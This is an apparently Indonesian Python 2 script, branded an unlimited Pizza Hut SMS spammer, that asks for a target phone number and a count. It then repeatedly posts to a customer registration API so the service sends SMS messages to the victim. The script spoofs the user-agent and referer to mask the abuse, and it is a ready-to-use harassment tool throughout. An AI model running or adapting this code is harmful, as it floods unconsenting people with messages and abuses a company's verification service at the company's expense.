# -*- coding: utf-8 -*-
import os, sys, json, requests
from fake_useragent import UserAgent
from requests.exceptions import *


ua = UserAgent()
hd = {
'user-agent': ua.random ,
'referer': 'https://www.phd.co.id/register',
'Host': 'api-prod.diqit.io',
}
z = 1
os.system("clear"),
print """\n
    \033[1;35m╔═════════════════════════════════════════════════╗
    \033[1;35m║ \033[31;1m╔═══╗╔══╗╔════╗╔════╗╔═══╗╔╗─╔╗╔╗─╔╗╔╗─╔╗╔════╗ \033[1;35m║
    \033[1;35m║ \033[31;1m║╔═╗║╚╣─╝╚══╗═║╚══╗═║║╔═╗║║║─║║║║─║║║║─║║║╔╗╔╗║ \033[1;35m║
    \033[1;35m║ \033[31;1m║╚═╝║─║║───╔╝╔╝──╔╝╔╝║║─║║║╚═╝║║╚═╝║║║─║║╚╝║║╚╝ \033[1;35m║
    \033[1;35m║ \033[37;1m║╔══╝─║║──╔╝╔╝──╔╝╔╝─║╚═╝║║╔═╗║║╔═╗║║║─║║──║║── \033[1;35m║
    \033[1;35m║ \033[37;1m║║───╔╣─╗╔╝═╚═╗╔╝═╚═╗║╔═╗║║║─║║║║─║║║╚═╝║──║║── \033[1;35m║
    \033[1;35m║ \033[37;1m╚╝───╚══╝╚════╝╚════╝╚╝─╚╝╚╝─╚╝╚╝─╚╝╚═══╝──╚╝── \033[1;35m║
\033[1;35m╔═══╩═════════════════════════════════════════════════╩═══╗
\033[1;35m║ \033[36;1m• \033[32;1mAuthor  \033[36;1m: \033[32;1mRomli ID                                    \033[1;35m║
\033[1;35m║ \033[36;1m• \033[31;1mYouTube \033[36;1m: \033[32;1mAVATAR ID                                   \033[1;35m║
\033[1;35m╠═════════════════════════════════════════════════════════╣
\033[1;35m║\033[36;1m>  SPAM SMS PIZZAHUT UNLIMITED TERBARU 2020              \033[1;35m║
\033[1;35m╠════════════════════════════════════╦════════════════════╝
\033[1;35m║\033[36;1m>  Contoh Nomor Target : 8873636363 \033[1;35m║
\033[1;35m╚════════════════════════════════════╝
"""
no = raw_input(" \033[32;1m[\033[36;1m•\033[32;1m] \033[36;1mMasukkan Nomor Target : ")
jum = raw_input(" \033[32;1m[\033[36;1m•\033[32;1m] \033[36;1mMassukan Jumlah Spam : ")

dat = {
'phone': no
}

for x in range(int(jum)):
        sia = requests.post("https://api-prod.diqit.io/customer/v1/customer/register", headers=hd, json=dat)
        if 'error' in sia:
                   print('\x1b[1;91m [×] Gagal Mengirim Spam Ke 0'+no)
        else:
                   print('\x1b[1;92m [✓] Sukses Mengirim Spam Ke 0'+no)
        z += 1
print ("###############################")
print ("          THANS YOU ")
print ("###############################")
